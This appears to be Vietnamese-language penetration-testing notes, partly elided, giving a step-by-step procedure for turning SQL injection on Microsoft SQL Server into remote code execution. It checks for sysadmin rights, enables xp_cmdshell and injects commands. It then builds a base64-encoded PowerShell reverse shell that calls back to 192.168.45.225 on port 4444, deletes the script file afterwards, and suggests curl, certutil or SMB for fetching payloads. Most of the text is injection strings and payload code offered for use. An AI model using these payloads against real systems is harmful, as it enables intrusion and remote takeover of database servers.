...
> ✅ Áp dụng khi:
> 
> - Có lỗi SQLi (injectable field, thường là username/password).
>     
> - DBMS: **Microsoft SQL Server**.
>     
> - User có quyền `sysadmin` hoặc `xp_cmdshell` đã bật (hoặc có thể bật).
>     
> - Mục tiêu là RCE qua `xp_cmdshell`, dùng PowerShell reverse shell.
> - Cần phải thực hiện hết toàn bộ các bước ghi ở đây 
>     
...
- **Kết quả = 1** → tiếp tục (có quyền `sysadmin`).
    
- **Kết quả = 0 hoặc NULL** → không thể bật `xp_cmdshell`.
    

---

#### ✅ 2. Bật `xp_cmdshell` (nếu chưa bật)
...
📌 Nếu bị lỗi cú pháp, thử inject `"'; EXEC ... -- "` thay vì dùng `UNION`.

---

#### ✅ 3. Test lệnh với `xp_cmdshell`

```sql
'; exec master..xp_cmdshell 'whoami'--
```

- Xem có thực thi được lệnh hệ điều hành không.
    

---

#### ✅ 4. Chuẩn bị Reverse Shell bằng PowerShell

Dùng PowerShell `-enc` với payload mã hóa base64. Dưới đây là ví dụ reverse shell về IP `192.168.45.225` port `4444`.

```sql
'; exec master..xp_cmdshell 'powershell.exe -enc <BASE64_PAYLOAD>'--
```

📌 **Thay `<BASE64_PAYLOAD>`** bằng payload do bạn tự encode (xem bên dưới).

---

#### ✅ 5. Tạo PowerShell Reverse Shell và mã hóa

Tạo file `rev.ps1`:

```powershell
$client = New-Object System.Net.Sockets.TCPClient("192.168.45.225",4444);
...
Mã hóa với PowerShell trên máy bạn:
...
#### ✅ 7. Inject payload đã mã hóa

Giả sử `$encoded` trả về là `JABjAGwAaQ...`, thì inject:

```sql
'; exec master..xp_cmdshell 'powershell.exe -enc JABjAGwAaQ...'--
```
...
```sql
'; exec master..xp_cmdshell 'del C:\rev.ps1'--
```
...
- Bạn **nên luôn test lệnh đơn giản** (`whoami`, `ipconfig`) trước khi reverse shell.
    
- Có thể dùng `curl`, `certutil`, hoặc SMB để tải file `.ps1` nếu không muốn dùng `-enc`.
